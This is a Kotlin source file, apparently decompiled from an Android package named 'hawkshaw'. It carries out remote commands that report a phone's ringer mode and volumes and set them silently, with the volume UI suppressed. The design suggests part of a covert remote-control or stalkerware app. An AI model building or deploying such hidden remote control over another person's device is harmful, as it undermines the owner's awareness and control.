package com.hawkshaw.library.features.misc

import android.content.Context
import android.media.AudioManager
import android.util.Log // Added for logging
import com.hawkshaw.library.App
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt
import com.hawkshaw.library.logger.Logger

private const val TAG = "DeviceAudio"

private object WhenMappings {
    val commandTypeMapping = Command.CommandType.entries.associateWith { type ->
        when (type) {
            Command.CommandType.PushDeviceAudio -> 1
            Command.CommandType.SetDeviceAudio -> 2
            else -> 0
        }
    }

    val ringerModeMapping = Command.DeviceAudioRequest.RingerMode.entries.associateWith { mode ->
        when (mode) {
            Command.DeviceAudioRequest.RingerMode.Unknown -> 1
            Command.DeviceAudioRequest.RingerMode.Normal -> 2
            Command.DeviceAudioRequest.RingerMode.Silent -> 3
            Command.DeviceAudioRequest.RingerMode.Vibrate -> 4
        }
    }
}

private fun getDeviceAudio() {
    Log.d(TAG, "[DEBUG] getDeviceAudio called.")
    val audioManager = App.getContext().getSystemService(Context.AUDIO_SERVICE) as? AudioManager
    if (audioManager != null) {
        Log.d(TAG, "[DEBUG] getDeviceAudio: AudioManager obtained.")
        val currentRingerModeInt = audioManager.ringerMode
        Log.d(TAG, "[DEBUG] getDeviceAudio: Current AudioManager ringerMode int: $currentRingerModeInt")
        val ringerMode = when (currentRingerModeInt) {
            AudioManager.RINGER_MODE_SILENT -> Command.DeviceAudioRequest.RingerMode.Silent
            AudioManager.RINGER_MODE_VIBRATE -> Command.DeviceAudioRequest.RingerMode.Vibrate
            AudioManager.RINGER_MODE_NORMAL -> Command.DeviceAudioRequest.RingerMode.Normal
            else -> Command.DeviceAudioRequest.RingerMode.Unknown
        }
        Log.d(TAG, "[DEBUG] getDeviceAudio: Mapped ringerMode: $ringerMode")

        val musicVol = getVolume(audioManager, AudioManager.STREAM_MUSIC)
        val ringVol = getVolume(audioManager, AudioManager.STREAM_RING)
        val callVol = getVolume(audioManager, AudioManager.STREAM_VOICE_CALL)
        val alarmVol = getVolume(audioManager, AudioManager.STREAM_ALARM)
        Log.d(TAG, "[DEBUG] getDeviceAudio: Volumes - Music: $musicVol, Ring: $ringVol, Call: $callVol, Alarm: $alarmVol")

        val deviceAudioRequest = Command.DeviceAudioRequest(
            ringerMode = ringerMode,
            musicVolume = musicVol,
            ringVolume = ringVol,
            callVolume = callVol,
            alarmVolume = alarmVol
        )
        Log.d(TAG, "[DEBUG] getDeviceAudio: Created DeviceAudioRequest: $deviceAudioRequest")

        val json = ContentNegotiationInterceptorKt.json
        // Existing Logger.d call is good for the final JSON
        Logger.d(TAG,
            "DeviceAudio: ${json.encodeToString(Command.DeviceAudioRequest.serializer(), deviceAudioRequest)}",
            false,
            4,
            null
        )
    } else {
        Log.w(TAG, "[DEBUG] getDeviceAudio: AudioManager was null.")
    }
}

private fun getVolume(audioManager: AudioManager, streamType: Int): Int {
    Log.d(TAG, "[DEBUG] getVolume called. streamType: $streamType")
    val streamVolume = audioManager.getStreamVolume(streamType)
    val maxVolume = audioManager.getStreamMaxVolume(streamType)
    Log.d(TAG, "[DEBUG] getVolume: streamType=$streamType, streamVolume=$streamVolume, maxVolume=$maxVolume")
    if (maxVolume == 0) { // Avoid division by zero
        Log.w(TAG, "[DEBUG] getVolume: maxVolume for streamType $streamType is 0. Returning 0.")
        return 0
    }
    val calculatedVolume = (streamVolume * 100 / maxVolume)
    Log.d(TAG, "[DEBUG] getVolume: streamType=$streamType, calculated percentage: $calculatedVolume")
    return calculatedVolume
}

fun handleDeviceAudioCommand(command: Command) {
    Log.d(TAG, "[DEBUG] handleDeviceAudioCommand called with command: $command")
    val commandMapping = WhenMappings.commandTypeMapping[command.type] ?: 0
    Log.d(TAG, "[DEBUG] handleDeviceAudioCommand: Command type mapping result: $commandMapping")
    when (commandMapping) {
        1 -> {
            Log.d(TAG, "[DEBUG] handleDeviceAudioCommand: Routing to getDeviceAudio().")
            getDeviceAudio()
        }
        2 -> {
            Log.d(TAG, "[DEBUG] handleDeviceAudioCommand: Routing to setDeviceAudio() with request: ${command.setDeviceAudioRequest}.")
            setDeviceAudio(command.setDeviceAudioRequest)
        }
        else -> {
            Log.w(TAG, "[DEBUG] handleDeviceAudioCommand: Unknown command type mapping: $commandMapping for command type: ${command.type}")
        }
    }
}

private fun setDeviceAudio(deviceAudioRequest: Command.DeviceAudioRequest?) {
    Log.d(TAG, "[DEBUG] setDeviceAudio called with request: $deviceAudioRequest")
    val audioManager = App.getContext().getSystemService(Context.AUDIO_SERVICE) as? AudioManager
    if (deviceAudioRequest != null && audioManager != null) {
        Log.d(TAG, "[DEBUG] setDeviceAudio: AudioManager and request are not null.")
        try {
            val ringerModeMappingValue = WhenMappings.ringerModeMapping[deviceAudioRequest.ringerMode] ?: 0
            Log.d(TAG, "[DEBUG] setDeviceAudio: RingerMode mapping result: $ringerModeMappingValue for requested mode: ${deviceAudioRequest.ringerMode}")
            val ringerModeToSet = when (ringerModeMappingValue) {
                1 -> audioManager.ringerMode // Unknown, keep current
                2 -> AudioManager.RINGER_MODE_NORMAL
                3 -> AudioManager.RINGER_MODE_SILENT
                4 -> AudioManager.RINGER_MODE_VIBRATE
                else -> {
                    Log.e(TAG, "[DEBUG] setDeviceAudio: Unknown ringer mode mapping: $ringerModeMappingValue. Defaulting to current ringer mode.")
                    audioManager.ringerMode // Default to current if mapping is unexpected
                }
            }
            Log.d(TAG, "[DEBUG] setDeviceAudio: Ringer mode to set (AudioManager constant): $ringerModeToSet")
            audioManager.ringerMode = ringerModeToSet
            Log.d(TAG, "[DEBUG] setDeviceAudio: Successfully set ringerMode to $ringerModeToSet. Current AudioManager ringerMode: ${audioManager.ringerMode}")
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] setDeviceAudio: Exception while setting ringer mode", e) // Added for debugging
            Logger.e(TAG, "SetDeviceAudio: ${e.message}", e, false, 12, null) // Existing log
        }

        Log.d(TAG, "[DEBUG] setDeviceAudio: Setting volumes...")
        setVolume(audioManager, AudioManager.STREAM_MUSIC, deviceAudioRequest.musicVolume)
        setVolume(audioManager, AudioManager.STREAM_RING, deviceAudioRequest.ringVolume)
        setVolume(audioManager, AudioManager.STREAM_VOICE_CALL, deviceAudioRequest.callVolume)
        setVolume(audioManager, AudioManager.STREAM_ALARM, deviceAudioRequest.alarmVolume)

        // Existing Logger.v is good for this final state
        Logger.v(TAG, "SetDeviceAudio: RingerMode - ${audioManager.ringerMode}", false, 4, null)
    } else {
        Log.w(TAG, "[DEBUG] setDeviceAudio: deviceAudioRequest or AudioManager was null. Request: $deviceAudioRequest, AudioManager: $audioManager")
    }
}

private fun setVolume(audioManager: AudioManager, streamType: Int, volume: Int) {
    Log.d(TAG, "[DEBUG] setVolume called. streamType: $streamType, requested volume percentage: $volume")
    if (volume >= 0) {
        val maxVolume = audioManager.getStreamMaxVolume(streamType)
        Log.d(TAG, "[DEBUG] setVolume: streamType=$streamType, maxVolume=$maxVolume")
        if (maxVolume == 0 && volume > 0) { // Avoid division by zero if stream cannot have volume
             Log.w(TAG, "[DEBUG] setVolume: maxVolume for streamType $streamType is 0, but requested volume is $volume. Cannot set volume.")
             return
        }
        val volumeToSet = if (maxVolume == 0) 0 else (maxVolume * volume) / 100
        Log.d(TAG, "[DEBUG] setVolume: streamType=$streamType, calculated absolute volume to set: $volumeToSet")
        audioManager.setStreamVolume(
            streamType,
            volumeToSet,
            0 // Flags, 0 typically means no special behavior (e.g., don't show UI)
        )
        Log.d(TAG, "[DEBUG] setVolume: Successfully set volume for streamType $streamType to $volumeToSet. Current actual stream volume: ${audioManager.getStreamVolume(streamType)}")
    } else {
        Log.d(TAG, "[DEBUG] setVolume: streamType=$streamType, requested volume $volume is < 0. Skipping.")
    }
}
